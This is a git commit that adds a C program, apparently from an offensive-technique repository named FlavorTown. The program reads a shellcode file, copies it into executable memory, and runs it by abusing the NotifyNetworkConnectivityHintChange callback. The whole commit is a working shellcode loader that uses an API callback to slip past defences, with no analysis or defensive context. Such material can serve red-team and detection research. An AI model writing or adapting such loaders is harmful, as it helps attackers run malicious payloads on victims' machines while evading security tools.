834c567c644166130b6fb616fe4ed7839d2c57a4
Wra7h <60988551+Wra7h@users.noreply.github.com>
2022-09-21 21:39:41 -0700

    Additional New Method [Sept 21]

---
+++ C/NotifyNetworkConnectivityHintChange.c
@@ -0,0 +1,63 @@
+// Wra7h/FlavorTown
+// Written/Compiled: Visual Studio 2022
+// Usage: this.exe <shellcode file>
+#pragma comment(lib, "Iphlpapi.lib")
+
+#include <stdio.h>
+#include <windows.h>
+#include <Iphlpapi.h>
+
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);
+
+INT wmain(INT argc, WCHAR* argv[])
+{
+	BOOL Ret = FALSE;
+	DWORD SCLen = 0;
+	PCHAR Shellcode = NULL;
+
+	if (argc != 2)
+	{
+		printf("Usage: NotifyNetworkConnectivityHintChange.exe C:\\Path\\To\\Shellcode.bin");
+		goto CLEANUP;
+	}
+
+	//Read shellcode and setup
+	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
+	if (!Ret)
+		goto CLEANUP;
+
+	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
+		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	memcpy(hAlloc, Shellcode, SCLen);
+
+	HANDLE hNotification = NULL;
+
+	NotifyNetworkConnectivityHintChange((PNETWORK_CONNECTIVITY_HINT_CHANGE_CALLBACK)hAlloc, NULL, TRUE, &hNotification);
+	
+	Sleep(120 * 1000); //2 Min
+
+CLEANUP:
+	if (Shellcode)
+		free(Shellcode);
+
+	return 0;
+}
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
+{
+	FILE* f = NULL;
+	_wfopen_s(&f, Filepath, L"rb");
+	if (f)
+	{
+		fseek(f, 0, SEEK_END);
+		*BufferSize = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		*Buffer = malloc(*BufferSize);
+		fread(*Buffer, *BufferSize, 1, f);
+		fclose(f);
+	}
+
+	return (*BufferSize != 0) ? TRUE : FALSE;
+}
